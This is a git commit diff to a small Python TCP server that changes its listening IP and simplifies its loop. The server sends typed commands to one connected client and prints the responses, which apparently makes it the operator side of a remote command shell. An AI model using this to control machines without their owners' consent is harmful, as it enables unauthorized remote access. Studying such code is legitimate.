ea6b553677788867e3f8823f715798433fc88e40
coder <136458027+momo33467@users.noreply.github.com>
2024-06-14 09:00:49 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,24 +1,23 @@
 import socket
 
 serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.76" # change this (the ip that we are listening on)
+host = "192.168.1.26" # change this (the ip that we are listening on)
 port =  1234 # change this
 
 serv.bind((host,port))
 serv.listen() 
 
-while True:
-    csoc, adder = serv.accept()
-    print(f"connected:{adder}")
+csoc, adder = serv.accept()
+print(f"connected:{adder}")
 
-    while True:  # Add an inner loop to continuously receive commands
-        command = input("command: ")  # Receive command from the user
-        csoc.send(command.encode('utf-8'))  # Send command to the client
+while True:  
+    command = input("command: ")  
+    csoc.send(command.encode('utf-8'))  
 
-        if command.lower() == "exit":  # If the command is 'exit', break the loop
-            break
+    if command.lower() == "exit":  
+        break
 
-        message = csoc.recv(1024).decode('utf-8')
-        print(f"the message: {message}")
-    
-    csoc.close()  # Close the connection
+    message = csoc.recv(1024).decode('utf-8')
+    print(f"the message: {message}")
+
+csoc.close()
